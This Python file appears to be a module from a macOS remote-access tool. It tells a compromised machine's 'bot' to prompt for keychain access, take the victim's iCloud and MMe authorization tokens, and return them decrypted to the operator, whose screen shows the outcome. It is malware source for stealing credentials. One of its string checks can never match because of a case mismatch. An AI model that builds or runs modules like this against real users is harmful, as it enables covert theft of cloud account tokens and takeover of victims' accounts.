# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Retrieve iCloud and MMe authorization tokens.",
            "References": [
                "https://github.com/manwhoami/MMeTokenDecrypt"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        # The bot handles locating the MMe/iCloud token directory; extra
        # input is not required beyond the keychain confirmation.
        return []

    def setup(self, set_options):
        should_continue = self._view.should_continue([
            "This will prompt the bot to allow keychain access."
        ])

        if should_continue:
            return True, None
        else:
            return False, None

    def process_response(self, response, response_options):
        str_response = self._safe_decode(response)

        self._view.output_separator()

        if not str_response.strip():
            self._view.output("No MMe/iCloud token data was returned.", "info")
            return

        if "iCloud entry not found in keychain" in str_response.lower():
            self._view.output("iCloud keychain entry was not found:", "attention")
            self._view.output(str_response)
            return

        if "clicked deny" in str_response.lower():
            self._view.output("The user denied keychain access.", "attention")
            self._view.output(str_response)
            return

        if "could not find mmettokenfile" in str_response.lower():
            self._view.output("Could not find the MMe token file:", "attention")
            self._view.output(str_response)
            return

        if "successfully decrypted" in str_response.lower():
            self._view.output("Tokens successfully decrypted:", "info")

        self._view.output(str_response)

    @staticmethod
    def _safe_decode(response):
        try:
            return response.decode("utf-8")
        except UnicodeDecodeError:
            return response.decode("utf-8", errors="replace")